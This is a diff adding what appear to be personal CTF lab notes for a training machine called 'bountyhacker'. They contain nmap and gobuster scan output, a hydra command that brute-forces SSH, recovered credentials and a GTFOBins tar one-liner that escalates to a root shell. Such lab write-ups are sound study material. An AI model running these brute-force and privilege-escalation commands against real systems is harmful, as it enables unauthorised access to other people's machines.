@@ -1,0 +1,73 @@
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-28 13:10 CEST
+Nmap scan report for 10.10.67.220
+Host is up (0.035s latency).
+Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: TIMEOUT
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.9.58.163
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 dcf8dfa7a6006d18b0702ba5aaa6143e (RSA)
+|   256 ecc0f2d91e6f487d389ae3bb08c40cc9 (ECDSA)
+|_  256 a41a15a5d4b1cf8f16503a7dd0d813c2 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+Aggressive OS guesses: HP P2000 G3 NAS device (91%), Linux 2.6.32 (90%), Infomir MAG-250 set-top box (90%), Ubiquiti AirMax NanoStation WAP (Linux 2.6.32) (90%), Linux 5.1 (90%), Ubiquiti AirOS 5.5.9 (90%), Linux 5.0 - 5.4 (89%), Ubiquiti Pico Station WAP (AirOS 5.2.6) (89%), Linux 2.6.32 - 3.13 (89%), Linux 3.3 (89%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT      ADDRESS
+1   34.82 ms 10.9.0.1
+2   35.06 ms 10.10.67.220
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 45.96 seconds
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.67.220
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.5
+[+] Timeout:                 10s
+===============================================================
+2023/04/28 13:12:24 Starting gobuster in directory enumeration mode
+===============================================================
+[2K/images               (Status: 301) [Size: 313] [--> http://10.10.67.220/images/]
+[2K/server-status        (Status: 403) [Size: 277]
+
+===============================================================
+2023/04/28 13:26:06 Finished
+===============================================================
+
+
+anonymously logged into FTP, finding a file with a bunch of passwords
+
+brute forced ssh with username lin and passlist as follows: hydra -l lin -P locks.txt ssh://10.10.67.220 -t 30
+
+got the credentials: lin:RedDr4gonSynd1cat3
+
+loggged into ssh and ran sudo -l to find the following:		User lin may run the following commands on bountyhacker:
+								(root) /bin/tar
+
+found exploit on gtfobins for tar: sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
